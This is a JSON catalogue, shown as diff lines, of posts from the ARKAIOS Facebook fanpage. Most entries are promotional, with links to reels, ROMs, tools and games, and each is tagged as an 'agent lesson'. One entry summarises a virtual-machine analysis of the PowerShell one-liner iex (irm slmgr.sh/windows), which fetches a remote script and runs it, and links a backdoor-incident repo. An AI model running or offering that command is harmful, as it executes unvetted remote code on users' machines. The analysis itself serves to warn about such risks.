+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1429553119006509/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1429553119006509/"
+  },
+  {
+    "id": "meta-776644758860856_122166885260989266",
+    "title": "https://www.facebook.com/share/r/197rcutfot/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1497790744800790/",
+    "canonical_url": "https://www.facebook.com/reel/1497790744800790/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1497790744800790/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "https://www.facebook.com/share/r/197rcutfot/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1497790744800790/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1497790744800790/"
+  },
+  {
+    "id": "meta-776644758860856_122166734522989266",
+    "title": "Convierte cualquier imagen a .ico (icono) para tu PC, Cel o donde lo quieras personalizar ademas de guardar tu pack de i",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122166734486989266&set=a.122111211968989266&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122166734486989266&set=a.122111211968989266&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122166734486989266&set=a.122111211968989266&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Convierte cualquier imagen a .ico (icono) para tu PC, Cel o donde lo quieras personalizar ademas de guardar tu pack de iconos propios así como compartirlos con toda la comunidad,,, Totalmente Gratis Siempre!!!.\nhttps://arkaios.qzz.io/E6EpdJD",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Convierte cualquier imagen a .ico (icono) para tu PC, Cel o donde lo quieras personalizar ademas de guardar tu pack de iconos propios así como compartirlos con toda la comunidad,,, Totalmente Gratis Siempre!!!.\nhttps://arkaios.qzz.io/E6EpdJD...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122166734486989266&set=a.122111211968989266&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122166303818989266",
+    "title": "https://www.facebook.com/share/v/1JJspggBup/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/4261754930804711/",
+    "canonical_url": "https://www.facebook.com/reel/4261754930804711/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/4261754930804711/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "https://www.facebook.com/share/v/1JJspggBup/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/4261754930804711/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/4261754930804711/"
+  },
+  {
+    "id": "meta-776644758860856_122166178538989266",
+    "title": "Entra a la web oficial desde aquí:",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1037413715606760/",
+    "canonical_url": "https://www.facebook.com/reel/1037413715606760/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1037413715606760/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Entra a la web oficial desde aquí:\nhttps://arkaios.qzz.io/4uR8TER",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1037413715606760/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1037413715606760/"
+  },
+  {
+    "id": "meta-776644758860856_122166178022989266",
+    "title": "Entra y prueba el juego desde aqui,,,",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2200667764060610/",
+    "canonical_url": "https://www.facebook.com/reel/2200667764060610/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2200667764060610/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Entra y prueba el juego desde aqui,,,\nhttps://arkaios.qzz.io/I2rbAKj",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2200667764060610/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2200667764060610/"
+  },
+  {
+    "id": "meta-776644758860856_122166176066989266",
+    "title": "Blink - AI App Builder | Build Apps in Minutes",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://l.facebook.com/l.php?u=https%3A%2F%2Farkaios.qzz.io%2F8RigvZZ&h=AUCq4EhDaO8sN-MQwaHoEMGnhD4WVArJEkRb3AXGVlfYF9acM6Y12pd2ZAGCKT3wd6Tb2QeuKk7aHHZYgOArkQyphtXsIIjFdWytOI53byf84lW3UQew6Vz1xB-mWeyosuEuT41cDJLH24pe&s=1",
+    "canonical_url": "https://l.facebook.com/l.php?u=https%3A%2F%2Farkaios.qzz.io%2F8RigvZZ&h=AUCq4EhDaO8sN-MQwaHoEMGnhD4WVArJEkRb3AXGVlfYF9acM6Y12pd2ZAGCKT3wd6Tb2QeuKk7aHHZYgOArkQyphtXsIIjFdWytOI53byf84lW3UQew6Vz1xB-mWeyosuEuT41cDJLH24pe&s=1",
+    "github_repo": null,
+    "website": "https://l.facebook.com/l.php?u=https%3A%2F%2Farkaios.qzz.io%2F8RigvZZ&h=AUCq4EhDaO8sN-MQwaHoEMGnhD4WVArJEkRb3AXGVlfYF9acM6Y12pd2ZAGCKT3wd6Tb2QeuKk7aHHZYgOArkQyphtXsIIjFdWytOI53byf84lW3UQew6Vz1xB-mWeyosuEuT41cDJLH24pe&s=1",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Entra a la web oficial desde aquí:",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Entra a la web oficial desde aquí: \n...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://l.facebook.com/l.php?u=https%3A%2F%2Farkaios.qzz.io%2F8RigvZZ&h=AUCq4EhDaO8sN-MQwaHoEMGnhD4WVArJEkRb3AXGVlfYF9acM6Y12pd2ZAGCKT3wd6Tb2QeuKk7aHHZYgOArkQyphtXsIIjFdWytOI53byf84lW3UQew6Vz1xB-mWeyosuEuT41cDJLH24pe&s=1"
+  },
+  {
+    "id": "meta-776644758860856_122166139184989266",
+    "title": "Entra desde aqui y disfruta la web:",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1917412498944947/",
+    "canonical_url": "https://www.facebook.com/reel/1917412498944947/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1917412498944947/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Entra desde aqui y disfruta la web:\n\"https://arkaios.qzz.io/W7aKlVA\"",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1917412498944947/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1917412498944947/"
+  },
+  {
+    "id": "meta-776644758860856_122165277170989266",
+    "title": "Descarga esta Increíble rom oficial desde aca:",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/906844171777177/",
+    "canonical_url": "https://www.facebook.com/reel/906844171777177/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/906844171777177/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Descarga esta Increíble rom oficial desde aca:\nhttps://arkaios.qzz.io/s/AfH483M",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/906844171777177/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/906844171777177/"
+  },
+  {
+    "id": "meta-776644758860856_122165276774989266",
+    "title": "Obten tu copia digital unica a partir de tu rom original aqui: https://arkaios.qzz.io/draNeal Obten tu version Unica",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1566532058201414/",
+    "canonical_url": "https://www.facebook.com/reel/1566532058201414/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1566532058201414/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Obten tu copia digital unica a partir de tu rom original aqui: https://arkaios.qzz.io/draNeal Obten tu version Unica\nhttps://arkaios.qzz.io/RhWxKJb Descarga la version final creada por Hamilton",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1566532058201414/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1566532058201414/"
+  },
+  {
+    "id": "meta-776644758860856_122165031230989266",
+    "title": "Si quieres mas info. o el estrato completo de clasificación fase de grupos y mas info. no dudes en entrar a la web:",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122165031170989266&set=a.122111211968989266&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122165031170989266&set=a.122111211968989266&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122165031170989266&set=a.122111211968989266&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Si quieres mas info. o el estrato completo de clasificación fase de grupos y mas info. no dudes en entrar a la web:\nhttps://www.msn.com/es-mx/deportes/futbol/fifa_world_cup?uxmode=ruby",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Si quieres mas info. o el estrato completo de clasificación fase de grupos y mas info. no dudes en entrar a la web:\nhttps://www.msn.com/es-mx/deportes/futbol/fifa_world_cup?uxmode=ruby...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122165031170989266&set=a.122111211968989266&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122165028296989266",
+    "title": "Publicación Oficial ARKAIOS #122165028296989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1532550091999366&set=a.568740435047008&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1532550091999366&set=a.568740435047008&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1532550091999366&set=a.568740435047008&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1532550091999366&set=a.568740435047008&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122165028158989266",
+    "title": "Publicación Oficial ARKAIOS #122165028158989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1335590538724194&set=a.486758520274071&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1335590538724194&set=a.486758520274071&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1335590538724194&set=a.486758520274071&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1335590538724194&set=a.486758520274071&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122165028074989266",
+    "title": "Publicación Oficial ARKAIOS #122165028074989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1534782585355382&set=a.556715823162068&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1534782585355382&set=a.556715823162068&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1534782585355382&set=a.556715823162068&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1534782585355382&set=a.556715823162068&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122165027912989266",
+    "title": "Publicación Oficial ARKAIOS #122165027912989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1335727135377201&set=a.486758520274071&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1335727135377201&set=a.486758520274071&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1335727135377201&set=a.486758520274071&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1335727135377201&set=a.486758520274071&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122165027828989266",
+    "title": "Publicación Oficial ARKAIOS #122165027828989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122167045874969300&set=a.122113990124969300&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122167045874969300&set=a.122113990124969300&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122167045874969300&set=a.122113990124969300&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122167045874969300&set=a.122113990124969300&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122165027474989266",
+    "title": "Publicación Oficial ARKAIOS #122165027474989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=898950243255564&set=a.283460081471253&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=898950243255564&set=a.283460081471253&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=898950243255564&set=a.283460081471253&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=898950243255564&set=a.283460081471253&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122165023004989266",
+    "title": "Publicación Oficial ARKAIOS #122165023004989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1606260674841492&set=a.444122014388703&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1606260674841492&set=a.444122014388703&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1606260674841492&set=a.444122014388703&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1606260674841492&set=a.444122014388703&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122164971050989266",
+    "title": "ARKAIOS Reel #1681684076278938",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1681684076278938/",
+    "canonical_url": "https://www.facebook.com/reel/1681684076278938/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1681684076278938/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1681684076278938/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1681684076278938/"
+  },
+  {
+    "id": "meta-776644758860856_122164970984989266",
+    "title": "ARKAIOS Reel #1563440055223554",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1563440055223554/",
+    "canonical_url": "https://www.facebook.com/reel/1563440055223554/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1563440055223554/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1563440055223554/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1563440055223554/"
+  },
+  {
+    "id": "meta-776644758860856_122164970498989266",
+    "title": "Publicación Oficial ARKAIOS #122164970498989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1627898352671391&set=a.468363925291512&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1627898352671391&set=a.468363925291512&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1627898352671391&set=a.468363925291512&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1627898352671391&set=a.468363925291512&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122164970342989266",
+    "title": "ARKAIOS Reel #1303782411744541",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1303782411744541/",
+    "canonical_url": "https://www.facebook.com/reel/1303782411744541/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1303782411744541/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1303782411744541/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1303782411744541/"
+  },
+  {
+    "id": "meta-776644758860856_122164958066989266",
+    "title": "Les dejamos el proyecto mas ambicioso para dj's y vdj's",
+    "category": "Multi-Agent Intelligence & MCP",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1033316952513658/",
+    "canonical_url": "https://www.facebook.com/reel/1033316952513658/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1033316952513658/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Les dejamos el proyecto mas ambicioso para dj's y vdj's \nAsistant DJ,,, el \"Pulse DJ\" pero con anabolicos y totalmente Gratis!!!. \nRecuerda que para obtener la licencia de activación es necesario ponerte en contacto a través de esta fanpage para obtener tu serial Único con tu ID para que solo tu seas el único poseedor de la licencia y puedas mantener el sistema totalmente tuyo para siempre obtenid",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1033316952513658/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1033316952513658/"
+  },
+  {
+    "id": "meta-776644758860856_122164899908989266",
+    "title": "ARKAIOS Reel #1729657488382285",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1729657488382285/",
+    "canonical_url": "https://www.facebook.com/reel/1729657488382285/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1729657488382285/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1729657488382285/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1729657488382285/"
+  },
+  {
+    "id": "meta-776644758860856_122164893548989266",
+    "title": "ARKAIOS Reel #2087185691870848",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2087185691870848/",
+    "canonical_url": "https://www.facebook.com/reel/2087185691870848/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2087185691870848/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2087185691870848/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2087185691870848/"
+  },
+  {
+    "id": "meta-776644758860856_122164893116989266",
+    "title": "Publicación Oficial ARKAIOS #122164893116989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122164893086989266&set=a.122094865592989266&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122164893086989266&set=a.122094865592989266&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122164893086989266&set=a.122094865592989266&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122164893086989266&set=a.122094865592989266&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122164797170989266",
+    "title": "Ni modo no nos vengaron!!!:",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/4367149776868938/",
+    "canonical_url": "https://www.facebook.com/reel/4367149776868938/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/4367149776868938/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Ni modo no nos vengaron!!!: \n⚽🇲🇽 México\n⚽🇳🇴 Noruega",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/4367149776868938/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/4367149776868938/"
+  },
+  {
+    "id": "meta-776644758860856_122164703720989266",
+    "title": "Informe de Análisis: Comportamiento del comando iex (irm slmgr.sh/windows) en entorno virtualizado",
+    "category": "Critical Infrastructure & Legacy Resilience",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122164703684989266&set=a.122111211968989266&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122164703684989266&set=a.122111211968989266&type=3",
+    "github_repo": "https://github.com/djklmr2025/deno-backdoor-slmgr-sh-windows-incident",
+    "website": "https://www.facebook.com/photo.php?fbid=122164703684989266&set=a.122111211968989266&type=3",
+    "technologies": [
+      "Open Source",
+      "GitHub"
+    ],
+    "skills_unlocked": [
+      "Herramienta Open Source vinculada: https://github.com/djklmr2025/deno-backdoor-slmgr-sh-windows-incident"
+    ],
+    "summary": "Informe de Análisis: Comportamiento del comando iex (irm slmgr.sh/windows) en entorno virtualizado\nEl siguiente reporte documenta el análisis técnico realizado en un entorno de pruebas controlado (máquina virtual con Windows 10) para evaluar el impacto del comando iex (irm slmgr.sh/windows). Esta investigación se llevó a cabo con fines educativos para demostrar los riesgos de ejecutar scripts ofus",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Informe de Análisis: Comportamiento del comando iex (irm slmgr.sh/windows) en entorno virtualizado\nEl siguiente reporte documenta el análisis técnico realizado en un entorno de pruebas controlado (máquina virtual con Windows 10) para evaluar el impac...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122164703684989266&set=a.122111211968989266&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122164173956989266",
+    "title": "La principal enemiga de la Evolucion!!!:",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1527832246051248&set=a.643902181110930&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1527832246051248&set=a.643902181110930&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1527832246051248&set=a.643902181110930&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "La principal enemiga de la Evolucion!!!:",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: La principal enemiga de la Evolucion!!!:...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1527832246051248&set=a.643902181110930&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122164173878989266",
+    "title": "ARKAIOS Reel #915956431530500",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/915956431530500/",
+    "canonical_url": "https://www.facebook.com/reel/915956431530500/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/915956431530500/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/915956431530500/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
